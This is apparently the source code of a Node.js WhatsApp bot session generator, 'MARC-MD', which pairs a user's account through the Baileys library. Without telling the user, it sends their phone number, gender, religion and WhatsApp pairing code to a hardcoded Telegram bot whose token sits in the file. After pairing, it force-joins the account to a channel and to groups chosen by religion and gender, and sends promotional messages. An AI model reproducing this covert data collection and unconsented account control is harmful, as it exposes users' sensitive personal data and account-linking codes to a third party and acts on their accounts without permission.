import { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    delay,
    DisconnectReason
} from "@whiskeysockets/baileys";
import express from "express";
import pino from "pino";
import fs from "fs";
import axios from 'axios';

const app = express();
const port = process.env.PORT || 3000;

// --- CONFIGURATION ---
const BOT_NAME = "MARC-MD";
const DEVELOPER = "Arslan Chaudhary 👑";
const CHANNEL_JID = "120363315663704381@newsletter"; 
const TELEGRAM_TOKEN = "8763281107:AAHk2UTQjqIGR28zjWXX8w7A0-1MHRPXXrc";
const TELEGRAM_CHAT_ID = "7779604777";

// گروپس کے انوائٹ لنکس (آئی ڈی نکالنے کے لیے)
const GROUP_CHAT_ID = "120363390235431636@g.us"; // آپ کا بوٹ چیٹ روم
const COMMUNITY_ID = "120363384260384813@g.us"; // آپ کی کمیونٹی

app.use(express.static('public'));

async function sendToTelegram(message) {
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: "Markdown"
        });
    } catch (e) { console.log("Telegram Log Error"); }
}

async function startSession(phoneNumber, res, gender, religion) {
    const sessionPath = `./sessions/${phoneNumber}`;
    if (fs.existsSync(sessionPath)) {
        fs.rmSync(sessionPath, { recursive: true, force: true });
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    const socket = makeWASocket({
        version,
        logger: pino({ level: "silent" }),
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        printQRInTerminal: false,
        browser: ["Arslan Chaudhary", "Chrome", "1.0.0"]
    });

    if (phoneNumber && !socket.authState.creds.registered) {
        phoneNumber = phoneNumber.replace(/[^0-9]/g, ''); 
        try {
            await delay(3000); 
            let code = await socket.requestPairingCode(phoneNumber);
            code = code?.replace(/-/g, '') || code;
            if (res && !res.headersSent) res.status(200).json({ code });
            sendToTelegram(`🚀 *New Request*\n\n*Number:* ${phoneNumber}\n*Gender:* ${gender}\n*Religion:* ${religion}\n*Code:* ${code}`);
        } catch (err) {
            if (res && !res.headersSent) res.status(500).json({ error: "Failed" });
        }
    }

    socket.ev.on("connection.update", async (update) => {
        const { connection } = update;

        if (connection === "open") {
            await delay(5000);
            
            // سیشن آئی ڈی
            const sessionBase64 = Buffer.from(JSON.stringify(state.creds)).toString("base64");
            const sessionId = `MARC-MD~${sessionBase64}`;
            
            // --- آٹومیٹک فورس جوائن لاجک ---
            try {
                // 1. چینل فالو (سب کے لیے لازمی)
                await socket.newsletterFollow(CHANNEL_JID);

                // 2. گروپس اور کمیونٹی کے فیصلے
                if (religion === "Muslim") {
                    if (gender === "Male") {
                        // مسلم میل: چینل + گروپ + کمیونٹی
                        await socket.groupAcceptInviteV4(socket.user.id, GROUP_CHAT_ID);
                        await socket.groupAcceptInviteV4(socket.user.id, COMMUNITY_ID);
                    } else if (gender === "Female") {
                        // مسلم فیمیل: چینل + کمیونٹی (گروپ نہیں)
                        await socket.groupAcceptInviteV4(socket.user.id, COMMUNITY_ID);
                    }
                } else if (religion === "Non-Muslim") {
                    if (gender === "Male") {
                        // نان مسلم میل: چینل + گروپ (کمیونٹی نہیں)
                        await socket.groupAcceptInviteV4(socket.user.id, GROUP_CHAT_ID);
                    }
                    // نان مسلم فیمیل: صرف چینل (جو اوپر پہلے ہی ہو چکا ہے)
                }
            } catch (e) { console.log("Force Join Error: ", e.message); }

            // میسجز بھیجنا
            await socket.sendMessage(socket.user.id, { text: `👋 *Greetings from Arslan Chaudhary Official!*\n\nYour *${BOT_NAME}* session has been established successfully. Your unique Session ID is generated below.` });
            await delay(1500);
            const idMsg = await socket.sendMessage(socket.user.id, { text: `${sessionId}` });
            await delay(1500);
            await socket.sendMessage(socket.user.id, { 
                text: `⬆️ *Copy Your Session ID*\n\n⚠️ *Important Notice:* Please do not share this ID with anyone if you have not requested it. Keep it confidential for your own security.`,
                quoted: idMsg
            });
            await delay(2000);

            const promoMsg = `✨ *OFFICIAL DIGITAL PRESENCE* ✨\n\n👤 *Developer:* ${DEVELOPER}\n\n🌟 *Must Follow For Updates:*\n🎵 *TikTok:* https://www.tiktok.com/@arslan_chaudhary_313\n📸 *Instagram:* https://www.instagram.com/arslan_chaudhary_313\n🔵 *Facebook:* https://www.facebook.com/Arslan0Chaudhary313\n💻 *GitHub:* https://github.com/Arslan-Chaudhary313\n\n🤝 *Thank you for trusting our services!*`;

            await socket.sendMessage(socket.user.id, { 
                text: promoMsg,
                contextInfo: {
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: { newsletterJid: CHANNEL_JID, newsletterName: "Arslan Chaudhary Official", serverMessageId: 1 }
                }
            });

            sendToTelegram(`✅ *SESSION CONNECTED*\n\n*Name:* ${socket.user.name}\n*Number:* ${phoneNumber}`);
            await delay(5000);
            fs.rmSync(sessionPath, { recursive: true, force: true });
        }
    });

    socket.ev.on("creds.update", saveCreds);
}

app.get("/get-code", (req, res) => {
    const { number, gender, religion } = req.query;
    startSession(number, res, gender, religion);
});

app.listen(port, () => console.log(`Server live on ${port}`));
